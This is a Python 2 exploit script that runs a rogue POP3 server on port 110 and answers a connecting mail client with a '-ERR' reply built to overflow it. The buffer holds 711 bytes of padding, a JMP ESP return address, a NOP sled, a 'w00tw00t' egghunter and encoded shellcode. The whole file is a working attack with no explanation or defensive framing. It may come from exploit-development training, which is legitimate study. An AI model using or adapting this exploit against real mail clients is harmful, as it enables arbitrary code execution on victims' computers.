#!/usr/bin/python

import socket

# EIP offset is 711
# Buffer data is in ESP and EDI
# It seems possible to JMP ESP and JMP backwards for a few hundred bytes of space
#  or JMP EDI for a few hundred bytes of space
#  however, I will be using an egghunter placed as ESP

# JMP EDI at 0x7567052d
# JMP ESP at 0x75745ce7

shellcode = ""
shellcode += "\xdb\xd8\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
shellcode += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
shellcode += "\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x38\x68\x6d\x52"
shellcode += "\x45\x50\x67\x70\x37\x70\x51\x70\x4e\x69\x59\x75\x50"
shellcode += "\x31\x6f\x30\x70\x64\x6e\x6b\x52\x70\x56\x50\x4c\x4b"
shellcode += "\x63\x62\x54\x4c\x4c\x4b\x66\x32\x35\x44\x6e\x6b\x50"
shellcode += "\x72\x64\x68\x46\x6f\x48\x37\x73\x7a\x37\x56\x46\x51"
shellcode += "\x49\x6f\x6c\x6c\x55\x6c\x50\x61\x33\x4c\x56\x62\x44"
shellcode += "\x6c\x65\x70\x7a\x61\x48\x4f\x34\x4d\x76\x61\x4f\x37"
shellcode += "\x59\x72\x4b\x42\x56\x32\x32\x77\x6e\x6b\x53\x62\x66"
shellcode += "\x70\x6e\x6b\x50\x4a\x47\x4c\x4e\x6b\x52\x6c\x36\x71"
shellcode += "\x34\x38\x39\x73\x53\x78\x43\x31\x6e\x31\x46\x31\x6e"
shellcode += "\x6b\x66\x39\x45\x70\x63\x31\x38\x53\x6e\x6b\x30\x49"
shellcode += "\x64\x58\x5a\x43\x66\x5a\x72\x69\x6e\x6b\x46\x54\x6c"
shellcode += "\x4b\x55\x51\x6b\x66\x55\x61\x49\x6f\x6c\x6c\x69\x51"
shellcode += "\x7a\x6f\x34\x4d\x55\x51\x68\x47\x75\x68\x69\x70\x33"
shellcode += "\x45\x49\x66\x56\x63\x71\x6d\x6a\x58\x45\x6b\x53\x4d"
shellcode += "\x66\x44\x71\x65\x39\x74\x46\x38\x4c\x4b\x31\x48\x71"
shellcode += "\x34\x66\x61\x4b\x63\x63\x56\x4e\x6b\x46\x6c\x70\x4b"
shellcode += "\x6c\x4b\x43\x68\x77\x6c\x47\x71\x6a\x73\x4e\x6b\x34"
shellcode += "\x44\x4c\x4b\x63\x31\x68\x50\x4c\x49\x70\x44\x55\x74"
shellcode += "\x65\x74\x61\x4b\x73\x6b\x51\x71\x46\x39\x32\x7a\x50"
shellcode += "\x51\x39\x6f\x69\x70\x71\x4f\x31\x4f\x63\x6a\x6c\x4b"
shellcode += "\x45\x42\x38\x6b\x4e\x6d\x53\x6d\x32\x4a\x56\x61\x4c"
shellcode += "\x4d\x6b\x35\x4f\x42\x75\x50\x57\x70\x37\x70\x52\x70"
shellcode += "\x33\x58\x55\x61\x4e\x6b\x52\x4f\x4f\x77\x39\x6f\x78"
shellcode += "\x55\x4d\x6b\x78\x70\x4d\x65\x6c\x62\x66\x36\x52\x48"
shellcode += "\x6d\x76\x6c\x55\x6d\x6d\x4d\x4d\x59\x6f\x58\x55\x45"
shellcode += "\x6c\x77\x76\x63\x4c\x74\x4a\x6f\x70\x39\x6b\x49\x70"
shellcode += "\x61\x65\x67\x75\x6d\x6b\x70\x47\x35\x43\x34\x32\x70"
shellcode += "\x6f\x33\x5a\x47\x70\x42\x73\x69\x6f\x49\x45\x31\x73"
shellcode += "\x63\x51\x72\x4c\x55\x33\x46\x4e\x61\x75\x32\x58\x70"
shellcode += "\x65\x37\x70\x41\x41"

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

key = 'w00tw00t'

buf = '-ERR '
buf += 'A' * 711
buf += '\xe7\x5c\x74\x75' # JMP ESP
buf += '\x90' * 16
buf += egghunter
buf += 'C' * 1000
buf += key
buf += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('10.10.10.10',110))
s.listen(10)

print '[+] Waiting for connection...'

client_socket, client_address = s.accept()

print '[+] Accepted connection'

while True:
    print '[+] Attempting to send payload'
    client_socket.send(buf)

s.close()

print '[+] Connection closed'
